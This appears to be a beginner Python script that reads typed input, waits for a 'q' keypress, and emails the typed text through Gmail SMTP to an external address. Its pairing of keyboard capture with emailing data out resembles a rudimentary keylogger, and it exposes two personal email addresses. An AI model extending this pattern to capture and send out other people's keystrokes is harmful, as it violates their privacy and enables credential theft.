from email.message import EmailMessage
from app2 import password
import ssl
import smtplib
import keyboard

def print_hi(name):
    # Use a breakpoint in the code line below to debug your script.
    print(f'Hi, {name}')  # Press Ctrl+F8 to toggle the breakpoint.

# Press the green button in the gutter to run the script.
if __name__ == '__main__':
    print_hi('User')


keys = input('Enter a character or characters:\n')
print("The character you entered was:")
print(keys)
print('Enter another character or characters:\n')

while True:
    try:
        if keyboard.is_pressed('q'):
            print('You pressed the q key!')
            break
    except:
            break

#######Send Email#######
email_sender = 'kolten.spencer808@gmail.com'
email_password = password

email_receiver = 'kalen.sheldon92@yahoo.com'


subject = "Testing mail sender"
body = keys

em = EmailMessage()
em['From'] = email_sender
em['To'] = email_receiver
em['subject'] = subject
em.set_content(body)

context = ssl.create_default_context()

with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
    smtp.login(email_sender, email_password)
    smtp.sendmail(email_sender, email_receiver, em.as_string())
    print('Email has been sent')

